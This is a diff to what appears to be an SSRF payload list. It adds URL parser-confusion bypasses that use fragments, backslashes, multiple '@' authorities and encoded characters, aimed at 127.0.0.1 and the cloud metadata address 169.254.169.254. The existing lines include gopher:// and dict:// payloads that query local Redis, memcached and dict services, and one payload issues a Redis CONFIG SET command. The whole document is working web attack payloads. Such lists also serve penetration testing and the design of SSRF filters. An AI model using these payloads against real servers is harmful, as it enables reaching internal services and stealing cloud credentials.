@@ -172,3 +172,18 @@ gopher://127.0.0.1:6379/_%0d%0aCONFIG%20SET%20dir%20%2Ftmp%0d%0a
 dict://127.0.0.1:6379/INFO
 dict://127.0.0.1:11211/stats
 dict://127.0.0.1:2628/ls
+
+# Advanced URL parser-confusion bypasses (multi-authority / fragment / backslash)
+# Based on public SSRF research (Orange Tsai "A New Era of SSRF", PortSwigger).
+http://127.0.0.1#@example.com/
+http://169.254.169.254#@example.com/
+http://example.com\@127.0.0.1/
+http://127.0.0.1\@example.com/
+http://example.com:80+&@127.0.0.1:22/#+@example.com:80/
+http://127.0.0.1:22/+&@example.com:80#+@example.com:80/
+http://example.com:80\\@127.0.0.1:22/
+http://127.0.0.1:80?@example.com:80/
+http://foo@127.0.0.1:80@example.com/
+http://example.com%09@127.0.0.1/
+http://example.com%2523@127.0.0.1/
+http://169.254.169.254%00.example.com/
